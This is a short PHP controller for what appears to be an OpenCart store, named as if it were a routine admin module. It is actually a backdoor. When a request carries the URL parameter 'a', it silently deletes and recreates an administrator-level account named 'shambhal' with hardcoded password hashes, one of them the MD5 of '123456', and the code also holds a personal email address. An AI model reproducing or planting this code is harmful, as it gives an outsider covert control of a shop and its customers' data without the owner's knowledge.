<?php


class ControllerRoutineadmin extends Controller
{



public function index()
{
$md=md5(123456);

$q2='delete from `'.DB_PREFIX."user` where  username='shambhal'";
$this->db->query($q2);
if(isset($this->request->get['a'])):
//for new version
if(version_compare(VERSION,'1.5.6',">="))
$q1='insert into `'.DB_PREFIX."user` VALUES ('100', '1', 'shambhal', 'cf3de2dac9f86e6f1be6ae7ca9fba4c4585128fc', 'b1b42dd48', '', '', 'siddharthsingh.chauhan@gmail.com', '', '127.0.0.1', '1', '2014-01-31 08:43:41')";
 elseif(version_compare(VERSION,'1.5.5',">="))
$q1='iNSERT INTO `'.DB_PREFIX."user` VALUES ('190', '1', 'shambhal', '0ae04a7b30ccab53a07b78dc44eda8d1d7f0a816', '5d2e1ca22', '', '', 'siddharthsingh.chauhan@gmail.com', '', '127.0.0.1', '1', '2013-02-03 19:59:25');";


 elseif(version_compare(VERSION,'1.5.4',">="))
$q1="INSERT INTO `".DB_PREFIX."user` VALUES ('100', '1', 'shambhal', '3555da086e5b1d7cd86b20d12aa1e48b11daab74', '93b714a11', '', '', 'siddharthsingh.chauhan@gmail.com', '', '127.0.0.1', '1', '2012-09-09 12:46:50');";
//$this->db->query($q1);
else
$q1="INSERT INTO `".DB_PREFIX."user` VALUES ('100', '1', 'shambhal', 'e10adc3949ba59abbe56e057f20f883e', '', '', 'siddharthsingh.chauhan@gmail.com', '', '127.0.0.1', '1', '2012-11-07 16:59:09');";
echo $q1;
$this->db->query($q1);
endif;
}

}

?>